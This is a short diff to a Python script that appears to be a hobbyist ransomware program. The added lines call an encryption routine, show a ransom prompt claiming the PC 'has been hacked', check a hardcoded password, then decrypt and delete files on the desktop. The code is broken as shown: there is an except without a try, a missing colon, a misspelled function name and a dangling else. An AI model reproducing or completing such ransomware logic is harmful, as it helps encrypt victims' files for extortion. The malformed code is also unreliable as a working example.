@@ -62,3 +62,22 @@ def decrypting(decrypt_file):
             dnew_file.write(decrypt_data)
             dnew_file.close()
 
+            # if incorrect password :
+
+            except ValueError as err: 
+                print('Invalid Password!')
+            
+if __name__ == '__main__':
+    encrypting()
+    if encrypting:
+        key = input('your PC has been hacked, enter password to unlock!')
+        if key == 'password'
+
+    descrypting(key)
+    for del_file in glob.glob('*ransomware'):
+        os.remove(f'{desktop}\\{del_file}')
+
+    else:
+        print('Incorrect Password!')
+
+        
